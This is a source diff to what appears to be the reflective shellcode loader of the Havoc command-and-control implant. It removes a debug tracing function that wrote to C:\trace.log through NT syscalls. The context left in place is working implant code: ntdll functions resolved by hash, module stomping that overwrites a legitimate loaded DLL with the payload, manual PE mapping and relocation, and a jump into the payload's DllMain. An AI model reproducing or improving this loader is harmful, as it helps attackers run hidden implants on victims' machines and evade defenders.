@@ -9,84 +9,6 @@
 #define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
 #endif
 
-// debug tracing: writes to C:\trace.log using raw NT syscalls (no kernel32 needed)
-#define NTDLL_HASH 0x70e61753
-#define SYS_NTCREATEFILE 0x66163fbb
-#define SYS_NTWRITEFILE 0xe0d61db2
-#define SYS_NTCLOSE 0x40d6e69d
-
-typedef NTSTATUS ( NTAPI *NTCREATEFILE )(
-    PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
-    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength
-);
-typedef NTSTATUS ( NTAPI *NTWRITEFILE )(
-    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
-    PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key
-);
-typedef NTSTATUS ( NTAPI *NTCLOSE )( HANDLE Handle );
-
-// pre-initialized OBJECT_ATTRIBUTES for \??\C:\trace.log
-// we build this at runtime to avoid .data section bloat
-
-SEC( text, B ) VOID FileTrace( PCHAR Message )
-{
-    // resolve ntdll
-    UINT_PTR ntdll = LoaderModPebbb( NTDLL_HASH );
-    if ( ntdll == 0 || ntdll == ( UINT_PTR ) -1 ) return;
-
-    NTCREATEFILE pNtCreateFile = ( NTCREATEFILE ) LoaderFuncAdd( ntdll, SYS_NTCREATEFILE );
-    NTWRITEFILE pNtWriteFile = ( NTWRITEFILE ) LoaderFuncAdd( ntdll, SYS_NTWRITEFILE );
-    NTCLOSE pNtClose = ( NTCLOSE ) LoaderFuncAdd( ntdll, SYS_NTCLOSE );
-    if ( !pNtCreateFile || !pNtWriteFile || !pNtClose ) return;
-
-    // build the file path: \??\C:\trace.log
-    WCHAR path[] = L"\\??\\C:\\trace.log";
-    OBJECT_ATTRIBUTES oa = { 0 };
-    UNICODE_STRING us = { 0 };
-    USHORT pathLen = 0;
-    while ( path[ pathLen ] != 0 ) pathLen++;
-    us.Length = pathLen * sizeof( WCHAR );
-    us.MaximumLength = sizeof( path );
-    us.Buffer = path;
-    oa.Length = sizeof( OBJECT_ATTRIBUTES );
-    oa.ObjectName = &us;
-    oa.Attributes = OBJ_CASE_INSENSITIVE;
-
-    HANDLE hFile = NULL;
-    IO_STATUS_BLOCK ioStatus = { 0 };
-    LARGE_INTEGER allocSize = { 0 };
-    allocSize.QuadPart = 4096;
-
-    // open with append
-    NTSTATUS status = pNtCreateFile(
-        &hFile,
-        FILE_GENERIC_WRITE | SYNCHRONIZE,
-        &oa,
-        &ioStatus,
-        &allocSize,
-        FILE_ATTRIBUTE_NORMAL,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        FILE_OPEN_IF,
-        FILE_SYNCHRONOUS_IO_NONALERT,
-        NULL, 0
-    );
-
-    if ( !NT_SUCCESS( status ) || !hFile ) return;
-
-    // write message + newline
-    CHAR buf[256] = { 0 };
-    SIZE_T msgLen = 0;
-    while ( msgLen < 250 && Message[msgLen] ) { buf[msgLen] = Message[msgLen]; msgLen++; }
-    buf[msgLen++] = '\r';
-    buf[msgLen++] = '\n';
-
-    pNtWriteFile( hFile, NULL, NULL, NULL, &ioStatus, buf, (ULONG)msgLen, NULL, NULL );
-    pNtClose( hFile );
-}
-
-#define TRACE(msg) FileTrace(msg)
-
 // markers the teamserver locates & patches in the shellcode template to enable
 // module stomping and set the decoy module name at build time.
 #define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
@@ -150,9 +72,7 @@ SEC( text, B ) VOID Entry( VOID )
         KaynLibraryLdr = KaynCaller( );
     }
 
-    // resolve ntdll FIRST for tracing
     Instance.Modules.Ntdll = LoaderModPebbb( NTDLL_HASH );
-    TRACE( "[stub] Entry: starting" );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
     Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
@@ -160,14 +80,10 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
     Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
 
-    TRACE( "[stub] functions resolved" );
-
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
-
-    TRACE( "[stub] DLL located, PE headers parsed" );
 
     // Optional module stomping: overwrite a legitimate, already-loaded module
     // image with our payload. enabled per-build by the teamserver (gStompEnabled).
@@ -187,42 +103,31 @@ SEC( text, B ) VOID Entry( VOID )
         // explicitly clear StompBase: if both LdrGetDllHandle and LdrLoadDll
         // fail, StompBase must be NULL so we don't deref a garbage pointer
         StompBase = NULL;
-        TRACE( "[stub] stomp: looking for target DLL" );
         if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
         {
             StompBase = NULL;
-            TRACE( "[stub] stomp: not loaded, trying LdrLoadDll" );
             if ( ! NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase ) ) )
             {
                 StompBase = NULL;
-                TRACE( "[stub] stomp: LdrLoadDll FAILED" );
             }
         }
 
         if ( StompBase )
         {
-            TRACE( "[stub] stomp: got target DLL handle" );
             StompNt   = C_PTR( StompBase + ( ( PIMAGE_DOS_HEADER ) StompBase )->e_lfanew );
             StompSize = StompNt->OptionalHeader.SizeOfImage;
 
             // only stomp if the target can hold the entire payload image
             if ( StompSize >= NtHeaders->OptionalHeader.SizeOfImage )
             {
-                TRACE( "[stub] stomp: target size OK, using stomp base" );
                 KVirtualMemory = StompBase;
                 KHdrSize       = 0;
                 KMemSize       = NtHeaders->OptionalHeader.SizeOfImage;
                 Mapped         = TRUE;
             }
-            else
-            {
-                TRACE( "[stub] stomp: target too small, falling back" );
-            }
+            // else: target too small, fall through to NtAllocateVirtualMemory below
         }
-        else
-        {
-            TRACE( "[stub] stomp: no target DLL, falling back" );
-        }
+        // else: StompBase is NULL, fall through to NtAllocateVirtualMemory below
     }
 
     if ( ! Mapped && NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
@@ -230,7 +135,6 @@ SEC( text, B ) VOID Entry( VOID )
 
     if ( Mapped )
     {
-        TRACE( "[stub] memory ready, copying sections" );
         // TODO: find the base address of this shellcode in a better way?
         KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
         KaynArgs.DllCopy   = KaynLibraryLdr;
@@ -260,8 +164,6 @@ SEC( text, B ) VOID Entry( VOID )
         ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
         if ( ImageDir->VirtualAddress )
             KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );
-
-        TRACE( "[stub] relocations applied, setting protections" );
 
         for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
         {
@@ -314,10 +216,8 @@ SEC( text, B ) VOID Entry( VOID )
         // --------------------------------
         // 6. Finally executing our DllMain
         // --------------------------------
-        TRACE( "[stub] calling DllMain" );
         BOOL ( WINAPI *LLDKman ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
         LLDKman( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
-        TRACE( "[stub] DllMain returned" );
     }
 }
 
